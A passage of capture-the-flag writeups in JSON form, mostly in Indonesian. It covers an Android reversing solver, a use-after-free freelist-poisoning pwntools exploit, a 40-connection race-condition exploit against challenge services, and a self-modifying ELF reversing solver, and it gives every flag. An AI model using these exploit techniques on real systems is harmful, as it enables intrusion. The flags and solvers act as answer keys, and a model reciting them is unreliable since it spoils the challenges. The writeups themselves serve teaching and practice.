class_name:\n                continue\n            p = data\n            sizes = []\n            for _ in range(4):\n                v, p = self.leb(p)\n                sizes.append(v)\n            for _ in range(sizes[0] + sizes[1]):\n                for _ in range(2):\n                    _, p = self.leb(p)\n            for j in range(2):\n                idx = 0\n                for _ in range(sizes[2 + j]):\n                    delta, p = self.leb(p)\n                    idx += delta\n                    flags, p = self.leb(p)\n                    code, p = self.leb(p)\n                    if self.methods[idx] != (class_name, method_name):\n                        continue\n                    if code == 0:\n                        raise ValueError('Method is native; no DEX bytecode')\n                    registers, in_size, _, _, _, count = struct.unpack_from('<4H2I', self.b, code)\n                    words = list(struct.unpack_from(f'<{count}H', self.b, code + 16))\n                    return registers, in_size, words\n        raise LookupError(f'{class_name}.{method_name} missing')\n\n\ndef signed16(x):\n    return (x ^ 0x8000) - 0x8000\n\n\ndef smt_for_leaf(words, register_count, parameter_count):\n    \"\"\"Symbolic-execute the leaf's 8 non-linear 32-bit comparisons.\n\n    In the DEX all long arithmetic is masked to 32 bits, so using 32-bit\n    SMT bit-vectors here preserves the comparison results.\n    \"\"\"\n    regs = {register_count - parameter_count: ('array', set())}\n    definitions = []\n    comparisons = []\n    addresses = []\n\n    def const(x):\n        return f'(_ bv{x & MASK32} 32)', set()\n\n    def reg(i):\n        return regs[i]\n\n    def put(pc, dest, val):\n        sym = f't{pc:04x}'\n        definitions.append(f'(define-fun {sym} () (_ BitVec 32) {val[0]})')\n        regs[dest] = sym, val[1]\n\n    def combine(a, b, op):\n        return f'({op} {a[0]} {b[0]})', a[1] | b[1]\n\n    operators = {\n        'add': 'bvadd', 'sub': 'bvsub', 'mul': 'bvmul',\n        'and': 'bvand', 'or': 'bvor', 'xor': 'bvxor',\n        'shl': 'bvshl', 'ushr': 'bvlshr', 'shr': 'bvashr'\n    }\n    arith_long = {\n        0x9B: 'add', 0x9C: 'sub', 0x9D: 'mul',\n        0xA0: 'and', 0xA1: 'or', 0xA2: 'xor',\n        0xA3: 'shl', 0xA4: 'shr', 0xA5: 'ushr'\n    }\n    arith_2addr = {\n        0xBB: 'add', 0xBC: 'sub', 0xBD: 'mul', 0xBE: 'div',\n        0xBF: 'rem', 0xC0: 'and', 0xC1: 'or', 0xC2: 'xor',\n        0xC3: 'shl', 0xC4: 'shr', 0xC5: 'ushr'\n    }\n    pc = 0\n    while pc < len(words) and len(comparisons) < 8:\n        w = words[pc]\n        op = w & 0xFF\n        hi = w >> 8\n        if op == 0x08:                   # move-object/from16\n            regs[hi] = reg(words[pc + 1]); pc += 2\n        elif op == 0x21:                 # array-length (input length is checked as 16)\n            pc += 1\n        elif op in (0x32, 0x38, 0x39):  # if-eq, if-eqz, if-nez\n            pc += 2\n        elif op == 0x29:                 # goto/16: non-success case\n            pc += 2\n        elif op == 0x28:                 # goto\n            pc += 1\n        elif op == 0x12:                 # const/4\n            v = hi >> 4\n            regs[hi & 15] = const((v ^ 8) - 8)\n            pc += 1\n        elif op in (0x13, 0x16):         # const/16, const-wide/16\n            regs[hi] = const(signed16(words[pc + 1])); pc += 2\n        elif op in (0x14, 0x17):         # const, const-wide/32\n            v = words[pc + 1] | (words[pc + 2] << 16)\n            regs[hi] = const(v); pc += 3\n        elif op == 0x18:                 # const-wide\n            v = sum(words[pc + i] << (16 * (i - 1)) for i in range(1, 5))\n            regs[hi] = const(v); pc += 5\n        elif op == 0x05:                 # move-wide/from16\n            regs[hi] = reg(words[pc + 1]); pc += 2\n        elif op == 0x48:                 # aget-byte\n            dest = hi\n            idx_register = words[pc + 1] >> 8\n            match = re.fullmatch(r'\\(_ bv(\\d+) 32\\)', reg(idx_register)[0])\n            if not match:\n                raise ValueError(f'Nonconstant input index at DEX pc={pc:x}')\n            idx = int(match.group(1))\n            if not 0 <= idx < 16:\n                raise ValueError(f'Input index outside 16 bytes: {idx}')\n            regs[dest] = (f'x{idx}', {idx})\n            pc += 2\n        elif op == 0x81:                 # int-to-long\n            regs[hi & 15] = reg(hi >> 4); pc += 1\n        elif op in arith_long:\n            dest, a, b = hi, words[pc + 1] & 255, words[pc + 1] >> 8\n            put(pc, dest, combine(reg(a), reg(b), operators[arith_long[op]]))\n            pc += 2\n        elif op in arith_2addr:\n            dest, src = hi & 15, hi >> 4\n            put(pc, dest, combine(reg(dest), reg(src), operators[arith_2addr[op]]))\n            pc += 1\n        elif op == 0x31:                 # cmp-long; each followed by if-nez\n            a, b = words[pc + 1] & 255, words[pc + 1] >> 8\n            comparisons.append((reg(a), reg(b)))\n            addresses.append(pc)\n            pc += 2\n        else:\n            raise ValueError(f'Unexpected opcode {op:02x} at DEX pc={pc:x}')\n    if len(comparisons) != 8:\n        raise ValueError(f'Only recovered {len(comparisons)} comparisons')\n    smt = ['(set-logic QF_BV)', '(set-option :produce-models true)']\n    for i in range(16):\n        smt.append(f'(declare-const x{i} (_ BitVec 32))')\n        smt.append(f'(assert (bvuge x{i} (_ bv32 32)))')\n        smt.append(f'(assert (bvule x{i} (_ bv126 32)))')\n    smt.extend(definitions)\n    for a, b in comparisons:\n        smt.append(f'(assert (= {a[0]} {b[0]}))')\n    smt.extend(['(check-sat)', '(get-value (' + ' '.join(f'x{i}' for i in range(16)) + '))'])\n    return '\\n'.join(smt), pc, comparisons\n\n\ndef z3_solve(script):\n    \"\"\"Call installed libz3 directly; avoids requiring the Python z3-solver package.\"\"\"\n    path = ctypes.util.find_library('z3') or 'libz3.so.4'\n    try:\n        z3 = ctypes.CDLL(path)\n    except OSError as ex:\n        raise RuntimeError('System library libz3 is needed (e.g. package libz3-4)') from ex\n    z3.Z3_mk_config.restype = ctypes.c_void_p\n    z3.Z3_mk_context.argtypes = [ctypes.c_void_p]\n    z3.Z3_mk_context.restype = ctypes.c_void_p\n    z3.Z3_eval_smtlib2_string.argtypes = [ctypes.c_void_p, ctypes.c_char_p]\n    z3.Z3_eval_smtlib2_string.restype = ctypes.c_char_p\n    ctx = z3.Z3_mk_context(z3.Z3_mk_config())\n    result = z3.Z3_eval_smtlib2_string(ctx, script.encode())\n    out = result.decode() if result else ''\n    if not out.startswith('sat\\n'):\n        raise RuntimeError(f'No satisfiable key: {out[:400]}')\n    matches = re.findall(r'\\(x(\\d+)\\s+#x([0-9a-fA-F]+)\\)', out)\n    vals = {int(i): int(v, 16) for i, v in matches}\n    if len(vals) != 16:\n        raise ValueError(f'Could not read full model: {out}')\n    return bytes(vals[i] for i in range(16))\n\n\ndef leaf_encrypted_blob(words, pc):\n    \"\"\"Find fill-array-data's 48-byte array and read its little-endian payload.\"\"\"\n    # The 8th comparison is followed by an if, goto, const, new-array, fill-array-data.\n    for i in range(pc, min(pc + 32, len(words) - 2)):\n        if words[i] & 0xFF != 0x26:\n            continue\n        offset = words[i + 1] | (words[i + 2] << 16)\n        if offset & 0x80000000:\n            offset -= 0x100000000\n        target = i + offset\n        if words[target:target + 2] != [0x0300, 1]:\n            continue\n        size = words[target + 2] | (words[target + 3] << 16)\n        buf = struct.pack('<%dH' % ((size + 1) // 2), *words[target + 4:target + 4 + (size + 1) // 2])\n        return buf[:size]\n    raise ValueError('Could not locate leaf fill-array-data payload')\n\n\ndef cstr(b, p):\n    return b[p:b.index(0, p)]\n\n\ndef solve(apk):\n    with zipfile.ZipFile(apk) as z:\n        dex = Dex(z.read('classes.dex'))\n        native = z.read('lib/arm64-v8a/libgarden.so')\n\n    leaf_index, mask = native_state_and_leaf(native)\n    cname = f'Lone/sr/garden/leaf/L{leaf_index:04d};'\n    print(f'[+] Native selector: {cname} (24 rounds)')\n    r, in_size, words = dex.get_method(cname, 'verify')\n    query, pc, equations = smt_for_leaf(words, r, in_size)\n    print(f'[+] Recovered {len(equations)} Java equality constraints')\n    key = z3_solve(query)\n    print(f'[+] Key bytes: {key.hex()} ({key.decode(\"ascii\")})')\n\n    encrypted = leaf_encrypted_blob(words, pc)\n    if len(encrypted) != 48:\n        raise ValueError(f'Wrong leaf array length: {len(encrypted)}')\n    leaf_bytes = bytes(encrypted[i] ^ key[i % 16] for i in range(48))\n    native_bytes = bytes(a ^ b for a, b in zip(leaf_bytes, mask))\n    digest = hashlib.sha256(native_bytes).digest()\n    e_key = hashlib.sha256(digest + cstr(native, 0x86C)).digest()\n    m_key = hashlib.sha256(digest + cstr(native, 0x878)).digest()\n\n    # The JNI verifier computes HMAC-SHA256 and compares first 16 bytes to rodata.\n    message = native[0x5B0:0x5C0] + native[0x700:0x700 + 44]\n    expected = native[0x5D0:0x5E0]\n    actual = hmac.new(m_key, message, hashlib.sha256).digest()[:16]\n    print(f'[+] Native HMAC: {actual.hex()}')\n    print(f'[+] Expected   : {expected.hex()}')\n    if not hmac.compare_digest(actual, expected):\n        raise RuntimeError('Native HMAC verification failed; refusing to report a flag')\n\n    # Native success branch (0x228c..0x2370) generates 32 + 8 + 4 bytes.\n    h0 = hashlib.sha256(e_key + struct.pack('<I', 0)).digest()\n    h1 = hashlib.sha256(e_key + struct.pack('<I', 1)).digest()\n    pad32 = native[0x5C0:0x5D0] + native[0x570:0x580]\n    output = bytes(x ^ y for x, y in zip(h0, pad32))\n    output += bytes(x ^ y for x, y in zip(h1[:8], native[0x550:0x558]))\n    output += bytes(x ^ y for x, y in zip(h1[8:12], native[0x728:0x72C]))\n    flag = output.decode('ascii')\n    if not flag.startswith('isfcr{') or not flag.endswith('}'):\n        raise RuntimeError(f'Output does not match expected flag format: {flag!r}')\n    print(f'[+] Fully verified 44-byte native output')\n    print(f'<FLAG>{flag}</FLAG>')\n    return flag\n\n\nif __name__ == '__main__':\n    apk = Path(sys.argv[1]) if len(sys.argv) > 1 else Path(__file__).with_name('mirror-garden.apk')\n    solve(apk)"
      }
    ],
    "terminalOutputs": [],
    "flag": "isfcr{m1rr0r_g4rden_bl00ms_@t_m1dn1ght_7f3a}",
    "lessonsLearned": ""
  },
  {
    "id": "cryovault-pwn-slab",
    "title": "slab",
    "category": "Pwn",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-10-12",
    "author": "Nattt",
    "ctfName": "CryoVault",
    "tags": [],
    "description": "Writeup for challenge slab",
    "problemDescription": "Service menyediakan allocator sederhana dengan command `alloc`, `free`, `edit`, `read`, dan `report`. Bug UAF pada chunk yang sudah di-free memungkinkan metadata freelist ditimpa. Dengan poisoning, alokasi berikutnya diarahkan ke function pointer callback `report`, lalu callback diganti ke fungsi pembaca `flag.txt`.",
    "tools": [],
    "analysis": "Menu remote:\n\n```text\nslab store. commands: alloc | free <i> | edit <i> <hex> | read <i> | report | quit\n```\n\nSetiap chunk berukuran 0x60 byte dan data dibaca sebanyak 96 byte. Tabel pointer slot berada di sekitar `0x4b6b00`, sedangkan status slot berada di sekitar `0x4b6ac0`.\n\n`free 0` tidak menghapus pointer chunk dari tabel slot. Setelah itu `read 0` dan `edit 0` masih dapat mengakses chunk yang sudah dibebaskan. Isi awal freed chunk membocorkan metadata freelist:\n\n```text\ndata 0dbeb947a14c2f930000...\n```\n\nNilai 8 byte pertama dipakai sebagai key untuk membentuk pointer freelist palsu. Double-free/UAF juga dapat dipakai tanpa perlu libc karena allocator challenge menggunakan metadata slab custom.",
    "solution": [
      {
        "title": "Proteksi Binary",
        "content": "Binary remote adalah ELF x86-64 non-PIE: alamat kode seperti `0x401da4` dan `0x4022e6` konsisten. Fungsi memakai stack canary, terlihat dari akses `fs:0x28`. Analisis dilakukan black-box karena binary lokal tidak tersedia."
      },
      {
        "title": "Primitive",
        "content": "Primitive yang terbukti:\n\n- UAF read pada slot yang sudah di-free.\n- UAF write pada metadata freed chunk.\n- Freelist poisoning menuju alamat arbitrer.\n- Arbitrary read/write 96 byte pada alamat target.\n\nPoisoning ke `0x4b50d0` terbukti menghasilkan alokasi kedua yang menunjuk ke global callback report."
      },
      {
        "title": "Strategi Exploit",
        "content": "Handler command memanggil function pointer di `0x4b50d0` ketika menerima command `report`. Nilai awalnya adalah fungsi `nothing to report` di `0x401d6c`.\n\nArbitrary read pada code remote menemukan fungsi di `0x4022e6`:\n\n\n\nPayload kemudian menulis `p64(0x4022e6)` ke `0x4b50d0`. Command `report` menjalankan fungsi tersebut dan mengeluarkan isi flag.",
        "code": "mov esi, 0\nmov edi, 0x4872d4       ; \"flag.txt\"\ncall 0x429740           ; open\nmov edx, 0xa0\ncall 0x4297e0           ; read\ncall 0x429820           ; write ke output service"
      },
      {
        "title": "Hasil",
        "content": "Output service:",
        "code": "isfcr{cust0m_sl4b_n0_gl1bc_r3c1p3_s4v3s_y0u}"
      },
      {
        "title": "Solver Script",
        "content": "The complete solver script (`solve.py`) is included below.",
        "code": "#!/usr/bin/env python3\n\nfrom pwn import *\nimport re\nfrom pathlib import Path\n\ncontext.log_level = \"info\"\n\nHOST = args.HOST or \"0.cloud.chals.io\"\nPORT = int(args.PORT or 20535)\nBASE_DIR = Path(__file__).resolve().parent\n\nTARGET_REPORT = 0x4B50D0\nWIN = 0x4022E6\n\n\ndef start():\n    if not args.REMOTE:\n        log.error(\"Challenge binary tidak tersedia lokal; gunakan REMOTE HOST=... PORT=...\")\n    return remote(HOST, PORT, timeout=5)\n\n\ndef main():\n    io = start()\n    io.recvuntil(b\"\\n> \")\n\n    def cmd(line):\n        io.sendline(line)\n        return io.recvuntil(b\"\\n> \", timeout=5)\n\n    cmd(b\"alloc\")\n    cmd(b\"free 0\")\n\n    leaked = cmd(b\"read 0\")\n    match = re.search(rb\"data ([0-9a-f]{192})\", leaked)\n    if not match:\n        log.error(\"UAF leak tidak ditemukan: %r\", leaked)\n    key = u64(bytes.fromhex(match.group(1)[:16].decode()))\n    log.info(\"freelist key = %#x\", key)\n\n    # Overwrite the freelist link so the next allocation aliases the\n    # report callback pointer in .data.\n    cmd(b\"edit 0 \" + p64(key ^ TARGET_REPORT).hex().encode())\n    cmd(b\"alloc\")\n    cmd(b\"alloc\")\n\n    # The second allocation now points at 0x4b50d0.\n    cmd(b\"edit 1 \" + p64(WIN).hex().encode())\n    io.sendline(b\"report\")\n    result = io.recvuntil(b\"\\n> \", timeout=5)\n    print(result.decode(errors=\"replace\"), end=\"\")\n    io.close()\n\n\nif __name__ == \"__main__\":\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "isfcr{cust0m_sl4b_n0_gl1bc_r3c1p3_s4v3s_y0u}",
    "lessonsLearned": ""
  },
  {
    "id": "cryovault-pwn-tearing",
    "title": "tearing",
    "category": "Pwn",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-10-12",
    "author": "Nattt",
    "ctfName": "CryoVault",
    "tags": [],
    "description": "Writeup for challenge tearing",
    "problemDescription": "Service menyediakan `redeem`, `status`, dan `claim`. State dibagi antar koneksi. Satu `redeem` seharusnya ditolak karena `tickets` sudah negatif, tetapi update state tetap dapat terjadi ketika banyak koneksi masuk bersamaan.",
    "tools": [],
    "analysis": "Service menyediakan `redeem`, `status`, dan `claim`. State dibagi antar koneksi. Satu `redeem` seharusnya ditolak karena `tickets` sudah negatif, tetapi update state tetap dapat terjadi ketika banyak koneksi masuk bersamaan.",
    "solution": [
      {
        "title": "Observasi blackbox",
        "content": "Koneksi tunggal selalu menunjukkan:\n\n\n\nDengan 20 koneksi paralel, state berubah menjadi `prizes=14 tickets=-13`. Dengan 40 koneksi paralel, state yang terlihat adalah:\n\n\n\nRespons setiap koneksi masih `no tickets left`, sehingga pemeriksaan tiket dan update hadiah tidak atomik. Ini adalah race condition check-then-update pada state bersama.",
        "code": "status -> prizes=4 tickets=-3 need=15\nredeem -> no tickets left"
      },
      {
        "title": "Strategi exploit",
        "content": "`solve.py` membuka 40 koneksi bersamaan dan mengirim `redeem`. Socket tetap dipertahankan, lalu masing-masing diminta `status`. Jika salah satu melihat `prizes >= need`, socket yang sama mengirim `claim` dan mencetak respons flag."
      },
      {
        "title": "Hasil",
        "content": "Exploit remote menghasilkan:",
        "code": "isfcr{t0ct0u_w1nd0w_0nly_0p3ns_c0ncurr3ntly}"
      },
      {
        "title": "Menjalankan",
        "content": "Host dan port dapat dioverride sebagai argumen:",
        "code": "source /home/nata/ctf_env/bin/activate\npython3 solve.py"
      },
      {
        "title": "Solver Script",
        "content": "The complete solver script (`solve.py`) is included below.",
        "code": "#!/usr/bin/env python3\n\"\"\"Exploit the redeem check/update race in the tearing service.\"\"\"\n\nfrom concurrent.futures import ThreadPoolExecutor\nimport re\nimport socket\nimport sys\n\nHOST = \"0.cloud.chals.io\"\nPORT = 26166\nWORKERS = 40\n\n\ndef recv_prompt(sock):\n    data = b\"\"\n    while b\"> \" not in data:\n        chunk = sock.recv(256)\n        if not chunk:\n            raise RuntimeError(\"service closed before prompt\")\n        data += chunk\n    return data\n\n\ndef recv_result(sock):\n    data = b\"\"\n    while True:\n        try:\n            chunk = sock.recv(2048)\n        except socket.timeout:\n            return data\n        if not chunk:\n            return data\n        data += chunk\n\n\ndef one_redeem(_):\n    s = socket.create_connection((HOST, PORT), timeout=5)\n    s.settimeout(5)\n    recv_prompt(s)\n    s.sendall(b\"redeem\\n\")\n    response = recv_prompt(s)\n    return s, response\n\n\ndef main():\n    global HOST, PORT\n    host = sys.argv[1] if len(sys.argv) > 1 else HOST\n    port = int(sys.argv[2]) if len(sys.argv) > 2 else PORT\n    # Keep the service target configurable while preserving the challenge default.\n    HOST, PORT = host, port\n\n    with ThreadPoolExecutor(max_workers=WORKERS) as pool:\n        results = list(pool.map(one_redeem, range(WORKERS)))\n\n    for sock, redeem_reply in results:\n        try:\n            sock.sendall(b\"status\\n\")\n            status = recv_prompt(sock)\n            text = status.decode(errors=\"replace\")\n            m = re.search(r\"prizes=(-?\\d+) tickets=(-?\\d+) need=(\\d+)\", text)\n            if not m:\n                continue\n            prizes, tickets, need = map(int, m.groups())\n            print(f\"status: prizes={prizes} tickets={tickets} need={need}\")\n            if prizes >= need:\n                sock.sendall(b\"claim\\n\")\n                result = recv_result(sock).decode(errors=\"replace\")\n                print(result, end=\"\")\n                flag = re.search(r\"isfcr\\{[^}\\n]+\\}\", result)\n                if flag:\n                    print(f\"FLAG: {flag.group(0)}\")\n                    return\n        finally:\n            sock.close()\n    raise RuntimeError(\"race did not reach the claim threshold; run again\")\n\n\nif __name__ == \"__main__\":\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "isfcr{t0ct0u_w1nd0w_0nly_0p3ns_c0ncurr3ntly}",
    "lessonsLearned": ""
  },
  {
    "id": "cryovault-rev-ouroboros",
    "title": "Ouroboros — Reverse Engineering",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-10-12",
    "author": "Nattt",
    "ctfName": "CryoVault",
    "tags": [],
    "description": "Writeup for challenge Ouroboros — Reverse Engineering",
    "problemDescription": "`ouroboros` menerima **tepat 32 byte dari stdin**. Program mengalokasikan area executable dengan `mmap`, membuka empat potongan instruksi x86-64 menggunakan state yang bergantung pada input dan hasil tahap sebelumnya, lalu menjalankan masing-masing potongan. State akhir dibandingkan dengan 32 byte hardcoded. Seluruh transformasinya dapat dibalik.\n\n**Flag:** `isfcr{c0d3_th4t_3ats_1ts_t41l!!}`\n\n**Bukti:** menjalankan file ELF asli dengan 32 byte flag menghasilkan `CORRECT` dan exit code `0`, tanpa patch.",
    "tools": [],
    "analysis": "`strings` menampilkan `need exactly %d bytes of input`, `nope.`, dan `CORRECT`, tetapi tidak menyimpan flag secara plaintext.\n\nFungsi utama berada di alamat `0x400400`. `fread` membaca 32 byte di `0x400407`–`0x40042b`, dan program membuat dua salinan data input. Salah satunya ditransformasikan oleh empat stage, sedangkan buffer input asli dipakai sebagai potongan kunci 8-byte.\n\nTabel di `.rodata`:\n\n| Alamat virtual | Data |\n|---|---|\n| `0x401380` | Target akhir 32 byte untuk `memcmp` |\n| `0x4013a0` | Empat checksum 64-bit untuk decoded code |\n| `0x4013c0` | Empat panjang payload: 85, 93, 96, 85 |\n| `0x4013e0` | Pointer payload: `0x401520`, `0x4014c0`, `0x401460`, `0x401400` |\n\nDi `0x400560`–`0x4005f3` payload didekripsi; di `0x400640`–`0x400680` checksum diperiksa. Program memberi izin execute via `mprotect`, memanggil payload sebagai function pointer, lalu menghitung rolling hash payload (untuk derivasi kunci tahap berikutnya). Setelah 4 stage, `memcmp` di `0x40070a`–`0x400722` menentukan `CORRECT` atau `nope.`.",
    "solution": [
      {
        "title": "File Challenge",
        "content": "- `ouroboros`: ELF 64-bit x86-64, dynamically linked, stripped, non-PIE.\n- `solve.py`: pemulihan flag otomatis dari ELF, dekripsi dan verifikasi keempat stage, simulasi transformasi, serta pengujian hasil ke executable asli.\n- `stage0.bin`–`stage3.bin`: instruksi mesin setiap stage, hasil dekripsi saat analisis."
      },
      {
        "title": "Keystream SplitMix64",
        "content": "Dekripsi setiap stage menggunakan XOR ciphertext dengan blok 64-bit dari fungsi mirip *SplitMix64*:\n\n\n\nSeed blok pertama dibentuk dari:\n\n\n\nKunci tahap berikutnya menggunakan rolling hash atas *kode stage yang sudah didekripsi*, dengan state hash dari tahap sebelumnya. Hash pemeriksa kode memakai initial state tetap `0x00c0ffeebadc0de5`. Keduanya menggunakan fungsi `mix()` di atas.",
        "code": "MASK = (1 << 64) - 1\nG = 0x9e3779b97f4a7c15\n\ndef mix(x):\n    x = (x ^ (x >> 30)) * 0xbf58476d1ce4e5b9 & MASK\n    x = (x ^ (x >> 27)) * 0x94d049bb133111eb & MASK\n    return x ^ (x >> 31)"
      },
      {
        "title": "Known plaintext: prologue compiler",
        "content": "Seluruh stage merupakan fungsi x86-64 yang dimulai dengan:\n\n\n\nDelapan byte pertamanya, `f30f1efa554889e5`, menjadi *known plaintext*. Karena `mix()` adalah bijektif pada 64 bit, kita dapat melakukan inverse terhadap blok ciphertext pertama:\n\n\n\n`masked_seed` adalah `(original_input_chunk XOR chain_state)`. Dengan angka tersebut, seluruh payload bisa dibuka tanpa mengetahui flag terlebih dahulu. Hasilnya terverifikasi ketika checksum kode sama dengan empat nilai yang disimpan di `0x4013a0`:",
        "code": "f3 0f 1e fa    endbr64\n55             push rbp\n48 89 e5       mov rbp, rsp"
      },
      {
        "title": "Empat transformasi payload",
        "content": "Disassembly terhadap `stage0.bin`–`stage3.bin` menghasilkan operasi berikut, untuk `i=0..31`:\n\n| Stage | Operasi pada buffer salinan |\n|---|---|\n| 0 | `b[i] ^= (7*(i-13)) & 255` |\n| 1 | `b[i] = (b[i] + b[(i+1)&31]) & 255`, iterasi maju *in-place* |\n| 2 | `b[i] = ROL8(b[i],3)` |\n| 3 | `b[i] ^= (31*i+60) & 255` |\n\nSalah satu detail penting: ketika stage 1 menyelesaikan `i=31`, byte `b[0]` **sudah diperbarui** pada iterasi sebelumnya. Rumus khusus ini penting untuk inversi yang tepat."
      },
      {
        "title": "Algoritma Validasi atau Encoding",
        "content": "Target akhir tersimpan sebagai:\n\n\n\nMembalik program lebih mudah dari ujung ke awal:\n\n1. **Undo stage 3:** XOR lagi dengan `(31*i+60)&255`.\n2. **Undo stage 2:** `ROR8(...,3)`.\n3. **Undo stage 1:** misalkan `q` adalah output stage 1 dan `p` input stage 1. Karena operasi maju in-place, `p[31]=(q[31]-q[0])&255`; kemudian untuk `i` turun dari 30 ke 0: `p[i]=(q[i]-p[i+1])&255`.\n4. **Undo stage 0:** XOR lagi dengan `(7*(i-13))&255`.\n\nHasil tepat 32 byte:",
        "code": "61fe0ffd8b2d62e9b00fa3299ef2c8b631edefb71365e23fb53f744312821488"
      },
      {
        "title": "Penyusunan Solve Script",
        "content": "`solve.py` hanya memakai standard library Python, tidak memerlukan `z3` ataupun emulator. Jalankan dari direktori challenge:\n\n\n\nSolver membaca tabel ELF, mendekripsi keempat stage dengan inverse SplitMix64, memverifikasi checksum kode, membalik empat transformasi, memvalidasi input asli terhadap state keystream/chaining pada setiap stage, kemudian mengeksekusi `./ouroboros` asli.\n\nOutput akhir:",
        "code": "python3 solve.py"
      },
      {
        "title": "Catatan",
        "content": "Tidak diperlukan brute force 2^64 atau patch binary. Keystream reversible ditambah delapan byte prologue fungsi yang diketahui membuat kode stage dapat didekripsi. Pembandingan 32-byte di `.rodata` kemudian menyediakan target yang bisa di-invert, dan seluruh rantai hash dapat diverifikasi memakai flag hasilnya."
      },
      {
        "title": "Solver Script",
        "content": "The complete solver script (`solve.py`) is included below.",
        "code": "#!/usr/bin/env python3\n\"\"\"Ouroboros CTF solver (original ELF only, no binary patching).\n\nDeobfuscate four JIT code blocks with a known x86-64 function prologue,\ninvert all four block transformations, and replay every runtime check.\n\"\"\"\nfrom pathlib import Path\nimport struct\nimport subprocess\n\nHERE = Path(__file__).resolve().parent\nELF = HERE / 'ouroboros'\nMASK = (1 << 64) - 1\nGOLDEN = 0x9e3779b97f4a7c15\nMUL1 = 0xbf58476d1ce4e5b9\nMUL2 = 0x94d049bb133111eb\nINITIAL_HASH = 0x00c0ffeebadc0de5\nINITIAL_CHAIN = 0x1f0d1e5cafeb00b5\nPROLOGUE = bytes.fromhex('f30f1efa554889e5')  # endbr64; push rbp; mov rbp,rsp\n\n\ndef mix(x):\n    x = (x ^ (x >> 30)) * MUL1 & MASK\n    x = (x ^ (x >> 27)) * MUL2 & MASK\n    return x ^ (x >> 31)\n\n\ndef undo_xorshift(x, count):\n    y = x\n    for _ in range(7):\n        y = x ^ (y >> count)\n    return y\n\n\ndef unmix(x):\n    x = undo_xorshift(x, 31)\n    x = x * pow(MUL2, -1, 1 << 64) & MASK\n    x = undo_xorshift(x, 27)\n    x = x * pow(MUL1, -1, 1 << 64) & MASK\n    return undo_xorshift(x, 30)\n\n\ndef digest(payload, state=INITIAL_HASH):\n    for byte in payload:\n        state = mix(((state ^ byte) + GOLDEN) & MASK)\n    return state\n\n\ndef decode(blob, scalar):\n    \"\"\"XOR encrypted stage with successive 64-bit SplitMix outputs.\"\"\"\n    seed = (scalar + GOLDEN) & MASK\n    result = bytearray()\n    for p in range(0, len(blob), 8):\n        stream = mix((seed + (p // 8) * GOLDEN) & MASK).to_bytes(8, 'little')\n        result.extend(b ^ k for b, k in zip(blob[p:p+8], stream))\n    return bytes(result)\n\n\ndef forward(state, stage):\n    b = bytearray(state)\n    if stage == 0:\n        for i in range(32):\n            b[i] ^= (7 * (i - 13)) & 255\n    elif stage == 1:\n        # In-place forward iteration. At i=31, b[0] was already updated.\n        for i in range(32):\n            b[i] = (b[i] + b[(i + 1) & 31]) & 255\n    elif stage == 2:\n        for i in range(32):\n            b[i] = ((b[i] << 3) | (b[i] >> 5)) & 255\n    elif stage == 3:\n        for i in range(32):\n            b[i] ^= (31 * i + 60) & 255\n    return bytes(b)\n\n\ndef invert_expected(final_bytes):\n    b = bytearray(final_bytes)\n    # Undo stage 3 (XOR).\n    for i in range(32):\n        b[i] ^= (31 * i + 60) & 255\n    # Undo stage 2 (ROL8 by 3).\n    for i in range(32):\n        b[i] = ((b[i] >> 3) | (b[i] << 5)) & 255\n    # Undo stage 1 (in-place addition). q31 = p31 + q0.\n    earlier = bytearray(32)\n    earlier[31] = (b[31] - b[0]) & 255\n    for i in range(30, -1, -1):\n        earlier[i] = (b[i] - earlier[i + 1]) & 255\n    # Undo stage 0 (XOR).\n    for i in range(32):\n        earlier[i] ^= (7 * (i - 13)) & 255\n    return bytes(earlier)\n\n\ndef main():\n    binary = ELF.read_bytes()\n    expected = binary[0x1380:0x13a0]\n    checks = struct.unpack_from('<4Q', binary, 0x13a0)\n    lengths = struct.unpack_from('<4I', binary, 0x13c0)\n    addresses = struct.unpack_from('<4Q', binary, 0x13e0)\n    if len(expected) != 32 or len(binary) < 0x1575:\n        raise ValueError('Unexpected ELF layout')\n\n    # Recover stage plaintext via its identical, known eight-byte prologue.\n    # Stage encryption uses mix((raw_input_chunk ^ prev_state) + GOLDEN).\n    recovered_scalars = []\n    plaintexts = []\n    for i, (length, va) in enumerate(zip(lengths, addresses)):\n        blob = binary[va - 0x400000:va - 0x400000 + length]\n        first_cipher = int.from_bytes(blob[:8], 'little')\n        first_plain = int.from_bytes(PROLOGUE, 'little')\n        masked_scalar = (unmix(first_cipher ^ first_plain) - GOLDEN) & MASK\n        code = decode(blob, masked_scalar)\n        if not code.startswith(PROLOGUE) or digest(code) != checks[i]:\n            raise ValueError(f'Wrong stage {i} decryption')\n        recovered_scalars.append(masked_scalar)\n        plaintexts.append(code)\n        print(f'[+] Stage {i}: decrypted {len(code)} bytes; hash verified')\n\n    candidate = invert_expected(expected)\n    print(f'[+] Recovered input: {candidate!r}')\n    assert len(candidate) == 32\n\n    # Replay *all* input-dependent decryption keys and rolling hashes.\n    chain = INITIAL_CHAIN\n    state = candidate\n    for i in range(4):\n        raw64 = int.from_bytes(candidate[8*i:8*i+8], 'little')\n        if (raw64 ^ chain) != recovered_scalars[i]:\n            raise ValueError(f'Invalid signing/decryption state at stage {i}')\n        state = forward(state, i)\n        chain = digest(plaintexts[i], chain)\n        print(f'[+] Stage {i}: key, transform, chain hash all verified')\n\n    if state != expected:\n        raise ValueError('Final transformed bytes mismatch .rodata target')\n    print('[+] Final 32-byte comparison matches .rodata exactly')\n    test = subprocess.run([str(ELF)], input=candidate, capture_output=True, check=False)\n    print('[+] Binary output:', test.stdout.decode('utf-8', 'replace').strip())\n    print('[+] Exit code:', test.returncode)\n    if test.returncode != 0 or b'CORRECT' not in test.stdout:\n        raise RuntimeError('Original binary did not accept this input')\n    print(f'<FLAG>{candidate.decode(\"ascii\")}</FLAG>')\n\n\nif __name__ == '__main__':\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "isfcr{c0d3_th4t_3ats_1ts_t41l!!}",
    "lessonsLearned": ""
  },
  {
    "id": "cryovault-rev-palimpest",
    "title": "Palimpest — REV",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-10-12",
    "author": "Nattt",
    "ctfName": "CryoVault",
    "tags": [],
